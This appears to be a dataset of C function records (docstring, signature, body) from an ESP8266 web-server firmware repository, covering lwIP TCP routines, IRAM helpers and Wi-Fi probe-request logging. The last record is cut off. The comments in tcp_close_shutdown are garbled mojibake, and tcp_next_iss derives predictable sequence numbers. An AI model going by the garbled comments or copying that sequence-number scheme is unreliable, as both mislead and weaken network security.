{"docstring": "/**\n * Purges a TCP PCB. Removes any buffered data and frees the buffer memory\n * (pcb->ooseq, pcb->unsent and pcb->unacked are freed).\n *\n * @param pcb tcp_pcb to purge. The pcb itself is not deallocated!\n */\n", "func_signal": "void\ntcp_pcb_purge(struct tcp_pcb *pcb)", "code": "{\n  if (pcb->state != CLOSED &&\n     pcb->state != TIME_WAIT &&\n     pcb->state != LISTEN) {\n\n    LWIP_DEBUGF(TCP_DEBUG, (\"tcp_pcb_purge\\n\"));\n\n#if TCP_LISTEN_BACKLOG\n    if (pcb->state == SYN_RCVD) {\n      /* Need to find the corresponding listen_pcb and decrease its accepts_pending */\n      struct tcp_pcb_listen *lpcb;\n      LWIP_ASSERT(\"tcp_pcb_purge: pcb->state == SYN_RCVD but tcp_listen_pcbs is NULL\",\n        tcp_listen_pcbs.listen_pcbs != NULL);\n      for (lpcb = tcp_listen_pcbs.listen_pcbs; lpcb != NULL; lpcb = lpcb->next) {\n        if ((lpcb->local_port == pcb->local_port) &&\n            (ip_addr_isany(&lpcb->local_ip) ||\n             ip_addr_cmp(&pcb->local_ip, &lpcb->local_ip))) {\n            /* port and address of the listen pcb match the timed-out pcb */\n            LWIP_ASSERT(\"tcp_pcb_purge: listen pcb does not have accepts pending\",\n              lpcb->accepts_pending > 0);\n            lpcb->accepts_pending--;\n            break;\n          }\n      }\n    }\n#endif /* TCP_LISTEN_BACKLOG */\n\n\n    if (pcb->refused_data != NULL) {\n      LWIP_DEBUGF(TCP_DEBUG, (\"tcp_pcb_purge: data left on ->refused_data\\n\"));\n      pbuf_free(pcb->refused_data);\n      pcb->refused_data = NULL;\n    }\n    if (pcb->unsent != NULL) {\n      LWIP_DEBUGF(TCP_DEBUG, (\"tcp_pcb_purge: not all data sent\\n\"));\n    }\n    if (pcb->unacked != NULL) {\n      LWIP_DEBUGF(TCP_DEBUG, (\"tcp_pcb_purge: data left on ->unacked\\n\"));\n    }\n#if TCP_QUEUE_OOSEQ\n    if (pcb->ooseq != NULL) {\n      LWIP_DEBUGF(TCP_DEBUG, (\"tcp_pcb_purge: data left on ->ooseq\\n\"));\n    }\n    tcp_segs_free(pcb->ooseq);\n    pcb->ooseq = NULL;\n#endif /* TCP_QUEUE_OOSEQ */\n\n    /* Stop the retransmission timer as it will expect data on unacked\n       queue if it fires */\n    pcb->rtime = -1;\n\n    tcp_segs_free(pcb->unsent);\n    tcp_segs_free(pcb->unacked);\n    pcb->unacked = pcb->unsent = NULL;\n#if TCP_OVERSIZE\n    pcb->unsent_oversize = 0;\n#endif /* TCP_OVERSIZE */\n  }\n}", "path": "app\\sdklib\\lwip\\core\\tcp.c", "repo_name": "pvvx/esp8266web", "stars": 225, "license": "unlicense", "language": "c", "size": 17502}
{"docstring": "/**\n * Print tcp flags for debugging purposes.\n *\n * @param flags tcp flags, all active flags are printed\n */\n", "func_signal": "void\ntcp_debug_print_flags(u8_t flags)", "code": "{\n  if (flags & TCP_FIN) {\n    LWIP_DEBUGF(TCP_DEBUG, (\"FIN \"));\n  }\n  if (flags & TCP_SYN) {\n    LWIP_DEBUGF(TCP_DEBUG, (\"SYN \"));\n  }\n  if (flags & TCP_RST) {\n    LWIP_DEBUGF(TCP_DEBUG, (\"RST \"));\n  }\n  if (flags & TCP_PSH) {\n    LWIP_DEBUGF(TCP_DEBUG, (\"PSH \"));\n  }\n  if (flags & TCP_ACK) {\n    LWIP_DEBUGF(TCP_DEBUG, (\"ACK \"));\n  }\n  if (flags & TCP_URG) {\n    LWIP_DEBUGF(TCP_DEBUG, (\"URG \"));\n  }\n  if (flags & TCP_ECE) {\n    LWIP_DEBUGF(TCP_DEBUG, (\"ECE \"));\n  }\n  if (flags & TCP_CWR) {\n    LWIP_DEBUGF(TCP_DEBUG, (\"CWR \"));\n  }\n  LWIP_DEBUGF(TCP_DEBUG, (\"\\n\"));\n}", "path": "app\\sdklib\\lwip\\core\\tcp.c", "repo_name": "pvvx/esp8266web", "stars": 225, "license": "unlicense", "language": "c", "size": 17502}
{"docstring": "/**\n * Is called every TCP_FAST_INTERVAL (250 ms) and process data previously\n * \"refused\" by upper layer (application) and sends delayed ACKs.\n *\n * Automatically called from tcp_tmr().\n */\n", "func_signal": "void\ntcp_fasttmr(void)", "code": "{\n  struct tcp_pcb *pcb = tcp_active_pcbs;\n\n  while(pcb != NULL) {\n    struct tcp_pcb *next = pcb->next;\n    /* If there is data which was previously \"refused\" by upper layer */\n    if (pcb->refused_data != NULL) {\n      /* Notify again application with data previously received. */\n      err_t err;\n      LWIP_DEBUGF(TCP_INPUT_DEBUG, (\"tcp_fasttmr: notify kept packet\\n\"));\n      TCP_EVENT_RECV(pcb, pcb->refused_data, ERR_OK, err);\n      if (err == ERR_OK) {\n        pcb->refused_data = NULL;\n      } else if (err == ERR_ABRT) {\n        /* if err == ERR_ABRT, 'pcb' is already deallocated */\n        pcb = NULL;\n      }\n    }\n\n    /* send delayed ACKs */\n    if (pcb && (pcb->flags & TF_ACK_DELAY)) {\n      LWIP_DEBUGF(TCP_DEBUG, (\"tcp_fasttmr: delayed ACK\\n\"));\n      tcp_ack_now(pcb);\n      tcp_output(pcb);\n      pcb->flags &= ~(TF_ACK_DELAY | TF_ACK_NOW);\n    }\n\n    pcb = next;\n  }\n}", "path": "app\\sdklib\\lwip\\core\\tcp.c", "repo_name": "pvvx/esp8266web", "stars": 225, "license": "unlicense", "language": "c", "size": 17502}
{"docstring": "//extern void copy_s4d1(uint8 * pd, void * ps, uint32 len);\n/* \u0427\u0442\u0435\u043d\u0438\u0435 \u0431\u0443\u0444\u0435\u0440\u0430 \u0432 IRAM */\n", "func_signal": "bool ICACHE_RAM_ATTR eRamRead(uint32 addr, uint8 *pd, uint32 len)", "code": "{\n\tif (addr + len > eraminfo.size) return false;\n\tcopy_s4d1(pd, (void *)((uint32)eraminfo.base + addr), len);\n\treturn true;\n}", "path": "app\\sdklib\\system\\rom2ram.c", "repo_name": "pvvx/esp8266web", "stars": 225, "license": "unlicense", "language": "c", "size": 17502}
{"docstring": "/* \u041e\u043f\u0440\u0435\u0434\u0435\u043b\u0435\u043d\u0438\u0435 \u0440\u0430\u0437\u043c\u0435\u0440\u0430 \u0441\u0432\u043e\u0431\u043e\u0434\u043d\u043e\u0433\u043e \u0431\u0443\u0444\u0435\u0440\u0430 \u0432 IRAM \u0438 \u043e\u0447\u0438\u0441\u0442\u043a\u0430 BSS IRAM (\u0441\u0435\u0433\u043c\u0435\u043d\u0442 DATA_IRAM_ATTR) */\n", "func_signal": "int ICACHE_FLASH_ATTR iram_buf_init(void)", "code": "{\n\t uint32 * end = &_text_start[((((DPORT_BASE[9]>>3)&3)==3)? (0x08000 >> 2) : (0x0C000 >> 2))];\n\t eraminfo.size = (int32)((uint32)(end) - (uint32)eraminfo.base);\n\t if(eraminfo.size > 0) {\n\t\t uint32 * ptr = _lit4_start;\n\t\t while(ptr < end) *ptr++ = 0;\n\t }\n#if DEBUGSOO > 0\n\t else {\n\t\t os_printf(\"No free IRAM!\");\n\t }\n#endif\t \n\t return eraminfo.size;\n}", "path": "app\\sdklib\\system\\rom2ram.c", "repo_name": "pvvx/esp8266web", "stars": 225, "license": "unlicense", "language": "c", "size": 17502}
{"docstring": "/**\n * Calculates a new initial sequence number for new connections.\n *\n * @return u32_t pseudo random sequence number\n */\n", "func_signal": "u32_t\ntcp_next_iss(void)", "code": "{\n  static u32_t iss = 6510;\n  \n  again:\n    iss += tcp_ticks;       /* XXX */\n    if (iss == 0)\n  \t   goto again;\n\n  return iss;\n}", "path": "app\\sdklib\\lwip\\core\\tcp.c", "repo_name": "pvvx/esp8266web", "stars": 225, "license": "unlicense", "language": "c", "size": 17502}
{"docstring": "/**\n * Closes the TX side of a connection held by the PCB.\n * For tcp_close(), a RST is sent if the application didn't receive all data\n * (tcp_recved() not called for all data passed to recv callback).\n *\n * Listening pcbs are freed and may not be referenced any more.\n * Connection pcbs are freed if not yet connected and may not be referenced\n * any more. If a connection is established (at least SYN received or in\n * a closing state), the connection is closed, and put in a closing state.\n * The pcb is then automatically freed in tcp_slowtmr(). It is therefore\n * unsafe to reference it.\n *\n * @param pcb the tcp_pcb to close\n * @return ERR_OK if connection has been closed\n *         another err_t if closing failed and pcb is not freed\n */\n", "func_signal": "static err_t\ntcp_close_shutdown(struct tcp_pcb *pcb, u8_t rst_on_unacked_data)", "code": "{\n  err_t err;\n\n  if (rst_on_unacked_data && (pcb->state != LISTEN)) {\n    if ((pcb->refused_data != NULL) || (pcb->rcv_wnd != TCP_WND)) {\n      /* Not all data received by application, send RST to tell the remote\n         side about this. */\n      LWIP_ASSERT(\"pcb->flags & TF_RXCLOSED\", pcb->flags & TF_RXCLOSED);\n\n      /* don't call tcp_abort here: we must not deallocate the pcb since\n         that might not be expected when calling tcp_close */\n      tcp_rst(pcb->snd_nxt, pcb->rcv_nxt, &pcb->local_ip, &pcb->remote_ip,\n        pcb->local_port, pcb->remote_port);\n\n      tcp_pcb_purge(pcb);\n\n      /* TODO: to which state do we move now? */\n\n      /* move to TIME_WAIT since we close actively */\n      TCP_RMV(&tcp_active_pcbs, pcb);\n      pcb->state = TIME_WAIT;\n      TCP_REG(&tcp_tw_pcbs, pcb);\n\n      return ERR_OK;\n    }\n  }\n\n  switch (pcb->state) {\n  case CLOSED:\n    /* Closing a pcb in the CLOSED state might seem erroneous,\n     * however, it is in this state once allocated and as yet unused\n     * and the user needs some way to free it should the need arise.\n     * Calling tcp_close() with a pcb that has already been closed, (i.e. twice)\n     * or for a pcb that has been used and then entered the CLOSED state \n     * is erroneous, but this should never happen as the pcb has in those cases\n     * been freed, and so any remaining handles are bogus. */\n     /*\ufffd\ufffdCLOSED\u05f4\u032c\ufffd\u00b9\u0631\ufffd\u04bb\ufffd\ufffdpcb\ufffd\u01ba\ufffd\ufffd\u01f4\ufffd\ufffd\ufffd\u0123\ufffd\n     *\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u02e3\ufffd\u04bb\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u05f4\u032c\ufffd\u00b7\ufffd\ufffd\ufffd\ufffd\u02f6\ufffd\ufffd\u04bb\ufffd\u00fb\ufffd\ufffd\u02b9\ufffd\ufffd,\ufffd\u00fb\ufffd\ufffd\ufffd\u04aa\u04bb\u0429\ufffd\ucde8\ufffd\ufffd\ufffd\u0377\ufffd\ufffd\ufffd\n     *\ufffd\ufffd\ufffd\ufffd\u04bb\ufffd\ufffd\ufffd\u047e\ufffd\ufffd\ufffd\ufffd\u0631\u0575\ufffdpcb\ufffd\ufffdtcp_close(),(\ufffd\ufffd2\ufffd\ufffd)\ufffd\ufffd\ufffd\ufffd\u04bb\ufffd\ufffd\ufffd\u047e\ufffd\ufffd\ufffd\u02b9\ufffd\ufffd\ufffd\ufffd\u05ae\ufffd\udb4e\udf3d\ufffd\ufffd\ufffdCLOSE\u05f4\u032c\ufffd\u01f4\ufffd\ufffd\ufffd\ufffd\n     *\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u0429\ufffd\ufffd\ufffd\ufffd\u00b1\ufffd\ufffd\u0377\u0175\ufffdpcb\ufffd\u01f2\ufffd\ufffd\ufffd\ufffd\ufffd\u06b5\ufffd,\ufffd\ufffd\u02e3\ufffd\ufffd\u03ba\ufffd\u02a3\ufffd\ufffd\u013e\ufffd\ufffd\ufffd\u01fc\u0675\ufffd\n     */  \n    err = ERR_OK;//\ufffd\u8da8\ufffd\ufffd\ufffd\ufffd\u05b5\n    if (pcb->local_port != 0) {\n    \tTCP_RMV(&tcp_bound_pcbs, pcb); \n    }\n    memp_free(MEMP_TCP_PCB, pcb);//\ufffd\ufffdMEMP_TCP_PCB\ufffd\u06b4\ufffd\ufffd\ufffd\u8da8\ufffd\u0377\u0175\ufffd\ufffd\ufffdpcb\ufffd\ufffd\u04e6\ufffd\u0135\ufffd\u052a\u05b5,\ufffd\u0377\ufffd\ufffd\u06b4\ufffd\n    pcb = NULL;\n    break;\n  case LISTEN:\n    err = ERR_OK;\n    tcp_pcb_remove(&tcp_listen_pcbs.pcbs, pcb);//\ufffd\u04fc\ufffd\ufffd\ufffd\ufffdPCB\ufffd\u0431\ufffd\ufffd\ufffd\u027e\ufffd\ufffd\ufffd\u04e6\ufffd\ufffdpcb\n    memp_free(MEMP_TCP_PCB_LISTEN, pcb);//\ufffd\ufffdMEMP_TCP_PCB_LISTEN\ufffd\u06b4\ufffd\ufffd\ufffd\ufffd\ufffd\u8da8\ufffd\u0377\u0175\ufffdpcb\ufffd\ufffd\u052a\u05b5  ,\ufffd\u0377\ufffd\ufffd\u06b4\ufffd\n    pcb = NULL;\n    break;\n  case SYN_SENT:\n    err = ERR_OK;\n    tcp_pcb_remove(&tcp_active_pcbs, pcb);\n    memp_free(MEMP_TCP_PCB, pcb);\n    pcb = NULL;\n    snmp_inc_tcpattemptfails();\n    break;\n  case SYN_RCVD:\n    err = tcp_send_fin(pcb);//\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u0631\ufffdFIN\ufffd\ufffd\ufffd\u05b1\ufffd\ufffd\ufffd\n    if (err == ERR_OK) {\n      snmp_inc_tcpattemptfails();\n      pcb->state = FIN_WAIT_1;//\u05ea\ufffd\ufffdFIN_WAIT_1\u05f4\u032c\n    }\n    break;\n  case ESTABLISHED:\n    err = tcp_send_fin(pcb);\n    if (err == ERR_OK) {\n      snmp_inc_tcpestabresets();\n      pcb->state = FIN_WAIT_1;\n    }\n    break;\n  case CLOSE_WAIT:\n    err = tcp_send_fin(pcb);\n    if (err == ERR_OK) {\n      snmp_inc_tcpestabresets();\n      pcb->state = LAST_ACK;//\ufffd\ufffd\ufffd\ufffdLAST_ACK\ufffd\u0234\ufffdACK\ufffd\ufffd\u02b1\n    }\n    break;\n  default:\n    /* Has already been closed, do nothing. */\n    err = ERR_OK;\n    pcb = NULL;\n    break;\n  }\n\n  if (pcb != NULL && err == ERR_OK) {\n    /* To ensure all data has been sent when tcp_close returns, we have\n       to make sure tcp_output doesn't fail.\n       Since we don't really have to ensure all data has been sent when tcp_close\n       returns (unsent data is sent from tcp timer functions, also), we don't care\n       for the return value of tcp_output for now. */\n    /* @todo: When implementing SO_LINGER, this must be changed somehow:\n       If SOF_LINGER is set, the data should be sent and acked before close returns.\n       This can only be valid for sequential APIs, not for the raw API. */\n    tcp_output(pcb);//\ufffd\ufffd\ufffd\u00fa\ufffd\ufffd\ufffd\ufffd\u037f\ufffd\ufffd\u01bf\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u02a3\ufffd\ufffd\u0131\ufffd\ufffd\u0123\ufffd\ufffd\ufffd\ufffd\ufffdFIN\ufffd\ufffd\ufffd\u05b1\ufffd\ufffd\u0136\ufffd\n  }\n  return err;\n}", "path": "app\\sdklib\\lwip\\core\\tcp.c", "repo_name": "pvvx/esp8266web", "stars": 225, "license": "unlicense", "language": "c", "size": 17502}
{"docstring": "/******************************************************************************\n * FunctionName : add_next_probe_requests\n * \u0417\u0430\u043f\u0438\u0441\u044c \u043d\u043e\u0432\u043e\u0433\u043e probe_requests \u0432 \u0431\u0443\u0444\u0435\u0440 buf_probe_requests\n ******************************************************************************/\n", "func_signal": "void ICACHE_FLASH_ATTR add_next_probe_requests(Event_SoftAPMode_ProbeReqRecved_t *pr)", "code": "{\n\tuint32 i;\n\tuint32 e = probe_requests_count;\n\tif(e > MAX_COUNT_BUF_PROBEREQS) e = MAX_COUNT_BUF_PROBEREQS;\n\tuint32 * ptrs = (uint32 *) (&pr->mac);\n\tfor(i = 0; i < e; i++) {\n\t\tuint32 * ptrd = (uint32 *) (&buf_probe_requests[i]);\n\t\tif(ptrs[0] == ptrd[0] && (ptrs[1]<<16) == (ptrd[1]<<16)) {\n\t\t\tsint8 min = ptrd[1]>>16;\n\t\t\tsint8 max = ptrd[1]>>24;\n\t\t\tif(min > pr->rssi) min = pr->rssi;\n\t\t\telse if(max < pr->rssi) max = pr->rssi;\n\t\t\tptrd[1] = (ptrd[1] & 0xFFFF) | ((min<<16) & 0xFF0000) | ((max<<24) & 0xFF000000);\n\t\t\treturn;\n\t\t}\n\t}\n\tuint32 * ptrd = (uint32 *) (&buf_probe_requests[probe_requests_count & (MAX_COUNT_BUF_PROBEREQS-1)]);\n\tptrd[0] = ptrs[0];\n\tptrd[1] = (ptrs[1] & 0xFFFF) | ((pr->rssi << 16) & 0xFF0000) | ((pr->rssi << 24) & 0xFF000000);\n\tif(++probe_requests_count == 0) probe_requests_count |= 0x80000000;\n}", "path": "app\\web\\wifi_events.c", "repo_name": "pvvx/esp8266web", "stars": 225, "license": "unlicense", "language": "c", "size": 17502}
{"docstring": "/**\n * Calcluates the effective send mss that can be used for a specific IP address\n * by using ip_route to determin the netif used to send to the address and\n * calculating the minimum of TCP_MSS and that netif's mtu (if set).\n */\n", "func_signal": "u16_t\ntcp_eff_send_mss(u16_t sendmss, ip_addr_t *addr)", "code": "{\n  u16_t mss_s;\n  struct netif *outif;\n\n  outif = ip_route(addr);\n  if ((outif != NULL) && (outif->mtu != 0)) {\n    mss_s = outif->mtu - IP_HLEN - TCP_HLEN;\n    /* RFC 1122, chap 4.2.2.6:\n     * Eff.snd.MSS = min(SendMSS+20, MMS_S) - TCPhdrsize - IPoptionsize\n     * We correct for TCP options in tcp_write(), and don't support IP options.\n     */\n    sendmss = LWIP_MIN(sendmss, mss_s);\n  }\n  return sendmss;\n}", "path": "app\\sdklib\\lwip\\core\\tcp.c", "repo_name": "pvvx/esp8266web", "stars": 225, "license": "unlicense", "language": "c", "size": 17502}
{"docstring": "/**\n * Kills the oldest active connection that has lower priority than prio.\n *\n * @param prio minimum priority\n */\n", "func_signal": "static void ICACHE_FLASH_ATTR\ntcp_kill_prio(u8_t prio)", "code": "{\n  struct tcp_pcb *pcb, *inactive;\n  u32_t inactivity;\n  u8_t mprio;\n\n\n  mprio = TCP_PRIO_MAX;\n  \n  /* We kill the oldest active connection that has lower priority than prio. */\n  inactivity = 0;\n  inactive = NULL;\n  for(pcb = tcp_active_pcbs; pcb != NULL; pcb = pcb->next) {\n    if (pcb->prio <= prio &&\n       pcb->prio <= mprio &&\n       (u32_t)(tcp_ticks - pcb->tmr) >= inactivity) {\n      inactivity = tcp_ticks - pcb->tmr;\n      inactive = pcb;\n      mprio = pcb->prio;\n    }\n  }\n  if (inactive != NULL) {\n    LWIP_DEBUGF(TCP_DEBUG, (\"tcp_kill_prio: killing oldest PCB %p (%\"S32_F\")\\n\",\n           (void *)inactive, inactivity));\n    tcp_abort(inactive);\n  }\n}", "path": "app\\sdklib\\lwip\\core\\tcp.c", "repo_name": "pvvx/esp8266web", "stars": 225, "license": "unlicense", "language": "c", "size": 17502}
{"docstring": "/**\n * Called every 500 ms and implements the retransmission timer and the timer that\n * removes PCBs that have been in TIME-WAIT for enough time. It also increments\n * various timers such as the inactivity timer in each PCB.\n *\n * Automatically called from tcp_tmr().\n */\n", "func_signal": "void\ntcp_slowtmr(void)", "code": "{\n  struct tcp_pcb *pcb, *prev;\n  u16_t eff_wnd;\n  u8_t pcb_remove;      /* flag if a PCB should be removed */\n  u8_t pcb_reset;       /* flag if a RST should be sent when removing */\n  err_t err;\n\n  err = ERR_OK;\n\n  ++tcp_ticks;\n\n  /* Steps through all of the active PCBs. */\n  prev = NULL;\n  pcb = tcp_active_pcbs;\n  if (pcb == NULL) {\n    LWIP_DEBUGF(TCP_DEBUG, (\"tcp_slowtmr: no active pcbs\\n\"));\n  }\n  while (pcb != NULL) {\n    LWIP_DEBUGF(TCP_DEBUG, (\"tcp_slowtmr: processing active pcb\\n\"));\n    LWIP_ASSERT(\"tcp_slowtmr: active pcb->state != CLOSED\\n\", pcb->state != CLOSED);\n    LWIP_ASSERT(\"tcp_slowtmr: active pcb->state != LISTEN\\n\", pcb->state != LISTEN);\n    LWIP_ASSERT(\"tcp_slowtmr: active pcb->state != TIME-WAIT\\n\", pcb->state != TIME_WAIT);\n\n    pcb_remove = 0;\n    pcb_reset = 0;\n\n    if (pcb->state == SYN_SENT && pcb->nrtx == TCP_SYNMAXRTX) {\n      ++pcb_remove;\n      LWIP_DEBUGF(TCP_DEBUG, (\"tcp_slowtmr: max SYN retries reached\\n\"));\n    }\n    else if (pcb->nrtx == TCP_MAXRTX) {\n      ++pcb_remove;\n      LWIP_DEBUGF(TCP_DEBUG, (\"tcp_slowtmr: max DATA retries reached\\n\"));\n    } else {\n      if (pcb->persist_backoff > 0) {\n        /* If snd_wnd is zero, use persist timer to send 1 byte probes\n         * instead of using the standard retransmission mechanism. */\n        pcb->persist_cnt++;\n        if (pcb->persist_cnt >= system_get_data_of_array_8(tcp_persist_backoff, pcb->persist_backoff-1)) {\n          pcb->persist_cnt = 0;\n          if (pcb->persist_backoff < sizeof(tcp_persist_backoff)) {\n            pcb->persist_backoff++;\n          }\n          tcp_zero_window_probe(pcb);\n        }\n      } else {\n        /* Increase the retransmission timer if it is running */\n        if(pcb->rtime >= 0)\n          ++pcb->rtime;\n\n        if (pcb->unacked != NULL && pcb->rtime >= pcb->rto) {\n          /* Time for a retransmission. */\n          LWIP_DEBUGF(TCP_RTO_DEBUG, (\"tcp_slowtmr: rtime %\"S16_F\n                                      \" pcb->rto %\"S16_F\"\\n\",\n                                      pcb->rtime, pcb->rto));\n\n          /* Double retransmission time-out unless we are trying to\n           * connect to somebody (i.e., we are in SYN_SENT). */\n          if (pcb->state != SYN_SENT) {\n            pcb->rto = ((pcb->sa >> 3) + pcb->sv) << system_get_data_of_array_8(tcp_backoff, pcb->nrtx);\n//\t\t\tif (pcb->rto >= TCP_MAXRTO)\n//            \tpcb->rto >>= 1;\n          }\n\n          /* Reset the retransmission timer. */\n          pcb->rtime = 0;\n\n          /* Reduce congestion window and ssthresh. */\n          eff_wnd = LWIP_MIN(pcb->cwnd, pcb->snd_wnd);\n          pcb->ssthresh = eff_wnd >> 1;\n          if (pcb->ssthresh < (pcb->mss << 1)) {\n            pcb->ssthresh = (pcb->mss << 1);\n          }\n          pcb->cwnd = pcb->mss;\n          LWIP_DEBUGF(TCP_CWND_DEBUG, (\"tcp_slowtmr: cwnd %\"U16_F\n                                       \" ssthresh %\"U16_F\"\\n\",\n                                       pcb->cwnd, pcb->ssthresh));\n \n          /* The following needs to be called AFTER cwnd is set to one\n             mss - STJ */\n          tcp_rexmit_rto(pcb);\n        }\n      }\n    }\n    /* Check if this PCB has stayed too long in FIN-WAIT-2 */\n    if (pcb->state == FIN_WAIT_2) {\n      if ((u32_t)(tcp_ticks - pcb->tmr) >\n          TCP_FIN_WAIT_TIMEOUT / TCP_SLOW_INTERVAL) {\n        ++pcb_remove;\n        LWIP_DEBUGF(TCP_DEBUG, (\"tcp_slowtmr: removing pcb stuck in FIN-WAIT-2\\n\"));\n      }\n    }\n\n    /* Check if KEEPALIVE should be sent */\n    if((pcb->so_options & SOF_KEEPALIVE) &&\n       ((pcb->state == ESTABLISHED) ||\n        (pcb->state == CLOSE_WAIT))) {\n#if LWIP_TCP_KEEPALIVE\n      if((u32_t)(tcp_ticks - pcb->tmr) >\n         (pcb->keep_idle + (pcb->keep_cnt*pcb->keep_intvl))\n         / TCP_SLOW_INTERVAL)\n#else      \n      if((u32_t)(tcp_ticks - pcb->tmr) >\n         (pcb->keep_idle + TCP_MAXIDLE) / TCP_SLOW_INTERVAL)\n#endif /* LWIP_TCP_KEEPALIVE */\n      {\n        LWIP_DEBUGF(TCP_DEBUG, (\"tcp_slowtmr: KEEPALIVE timeout. Aborting connection to %\"U16_F\".%\"U16_F\".%\"U16_F\".%\"U16_F\".\\n\",\n                                ip4_addr1_16(&pcb->remote_ip), ip4_addr2_16(&pcb->remote_ip),\n                                ip4_addr3_16(&pcb->remote_ip), ip4_addr4_16(&pcb->remote_ip)));\n        \n        ++pcb_remove;\n        ++pcb_reset;\n      }\n#if LWIP_TCP_KEEPALIVE\n      else if((u32_t)(tcp_ticks - pcb->tmr) > \n              (pcb->keep_idle + pcb->keep_cnt_sent * pcb->keep_intvl)\n              / TCP_SLOW_INTERVAL)\n#else\n      else if((u32_t)(tcp_ticks - pcb->tmr) > \n              (pcb->keep_idle + pcb->keep_cnt_sent * TCP_KEEPINTVL_DEFAULT) \n              / TCP_SLOW_INTERVAL)\n#endif /* LWIP_TCP_KEEPALIVE */\n      {\n        tcp_keepalive(pcb);\n        pcb->keep_cnt_sent++;\n      }\n    }\n\n    /* If this PCB has queued out of sequence data, but has been\n       inactive for too long, will drop the data (it will eventually\n       be retransmitted). */\n#if TCP_QUEUE_OOSEQ\n    if (pcb->ooseq != NULL &&\n        (u32_t)tcp_ticks - pcb->tmr >= pcb->rto * TCP_OOSEQ_TIMEOUT) {\n      tcp_segs_free(pcb->ooseq);\n      pcb->ooseq = NULL;\n      LWIP_DEBUGF(TCP_CWND_DEBUG, (\"tcp_slowtmr: dropping OOSEQ queued data\\n\"));\n    }\n#endif /* TCP_QUEUE_OOSEQ */\n\n    /* Check if this PCB has stayed too long in SYN-RCVD */\n    if (pcb->state == SYN_RCVD) {\n      if ((u32_t)(tcp_ticks - pcb->tmr) >\n          TCP_SYN_RCVD_TIMEOUT / TCP_SLOW_INTERVAL) {\n        ++pcb_remove;\n        LWIP_DEBUGF(TCP_DEBUG, (\"tcp_slowtmr: removing pcb stuck in SYN-RCVD\\n\"));\n      }\n    }\n\n    /* Check if this PCB has stayed too long in LAST-ACK */\n    if (pcb->state == LAST_ACK) {\n      if ((u32_t)(tcp_ticks - pcb->tmr) > 2 * TCP_MSL / TCP_SLOW_INTERVAL) {\n        ++pcb_remove;\n        LWIP_DEBUGF(TCP_DEBUG, (\"tcp_slowtmr: removing pcb stuck in LAST-ACK\\n\"));\n      }\n    }\n\n    /* If the PCB should be removed, do it. */\n    if (pcb_remove) {\n      struct tcp_pcb *pcb2;\n      tcp_pcb_purge(pcb);\n      /* Remove PCB from tcp_active_pcbs list. */\n      if (prev != NULL) {\n        LWIP_ASSERT(\"tcp_slowtmr: middle tcp != tcp_active_pcbs\", pcb != tcp_active_pcbs);\n        prev->next = pcb->next;\n      } else {\n        /* This PCB was the first. */\n        LWIP_ASSERT(\"tcp_slowtmr: first pcb == tcp_active_pcbs\", tcp_active_pcbs == pcb);\n        tcp_active_pcbs = pcb->next;\n      }\n      \n      if (pcb_reset) {\n        tcp_rst(pcb->snd_nxt, pcb->rcv_nxt, &pcb->local_ip, &pcb->remote_ip,\n          pcb->local_port, pcb->remote_port);\n      }\n\t  \n\t  TCP_EVENT_ERR(pcb->errf, pcb->callback_arg, ERR_ABRT);\n      pcb2 = pcb;\n      pcb = pcb->next;\n      memp_free(MEMP_TCP_PCB, pcb2);\n    } else {\n      /* get the 'next' element now and work with 'prev' below (in case of abort) */\n      prev = pcb;\n      pcb = pcb->next;\n\n      /* We check if we should poll the connection. */\n      ++prev->polltmr;\n      if (prev->polltmr >= prev->pollinterval) {\n        prev->polltmr = 0;\n        LWIP_DEBUGF(TCP_DEBUG, (\"tcp_slowtmr: polling application\\n\"));\n        TCP_EVENT_POLL(prev, err);\n        /* if err == ERR_ABRT, 'prev' is already deallocated */\n        if (err == ERR_OK) {\n          tcp_output(prev);\n        }\n      }\n    }\n  }\n\n  \n  /* Steps through all of the TIME-WAIT PCBs. */\n  prev = NULL;\n  pcb = tcp_tw_pcbs;\n  while (pcb != NULL) {\n    LWIP_ASSERT(\"tcp_slowtmr: TIME-WAIT pcb->state == TIME-WAIT\", pcb->state == TIME_WAIT);\n    pcb_remove = 0;\n\n    /* Check if this PCB has stayed long enough in TIME-WAIT */\n    if ((u32_t)(tcp_ticks - pcb->tmr) > 2 * TCP_MSL / TCP_SLOW_INTERVAL) {\n      ++pcb_remove;\n    }\n    \n\n\n    /* If the PCB should be removed, do it. */\n    if (pcb_remove) {\n      struct tcp_pcb *pcb2;\n      tcp_pcb_purge(pcb);\n      /* Remove PCB from tcp_tw_pcbs list. */\n      if (prev != NULL) {\n        LWIP_ASSERT(\"tcp_slowtmr: middle tcp != tcp_tw_pcbs\", pcb != tcp_tw_pcbs);\n        prev->next = pcb->next;\n      } else {\n        /* This PCB was the first. */\n        LWIP_ASSERT(\"tcp_slowtmr: first pcb == tcp_tw_pcbs\", tcp_tw_pcbs == pcb);\n        tcp_tw_pcbs = pcb->next;\n      }\n      pcb2 = pcb;\n      pcb = pcb->next;\n      memp_free(MEMP_TCP_PCB, pcb2);\n    } else {\n      prev = pcb;\n      pcb = pcb->next;\n    }\n  }\n}", "path": "app\\sdklib\\lwip\\core\\tcp.c", "repo_name": "pvvx/esp8266web", "stars": 225, "license": "unlicense", "language": "c", "size": 17502}
{"docstring": "/******************************************************************************\n * FunctionName : wifi_handle_event_cb\n ******************************************************************************/\n", "func_signal": "void ICACHE_FLASH_ATTR wifi_handle_event_cb(System_Event_t *evt)", "code": "{\n#if DEBUGSOO > 1\n\tos_printf(\"WiFi event(%u): \", evt->event);\n#endif\n\tswitch (evt->event) {\n\t\tcase EVENT_SOFTAPMODE_PROBEREQRECVED:\n\t\t{\n#if DEBUGSOO > 1\n\t\t\tos_printf(\"Probe Request (MAC:\" MACSTR \", RSSI:%d)\\n\",\n\t\t\t\t\tMAC2STR(evt->event_info.ap_probereqrecved.mac),\n\t\t\t\t\tevt->event_info.ap_probereqrecved.rssi);\n#endif\n\t\t\tadd_next_probe_requests(&evt->event_info.ap_probereqrecved);\n\t\t\tbreak;\n\t\t}\n\t\tcase EVENT_STAMODE_CONNECTED:\n\t\t{\n#if DEBUGSOO > 1\n\t\t\tos_printf(\"Connect to ssid %s, channel 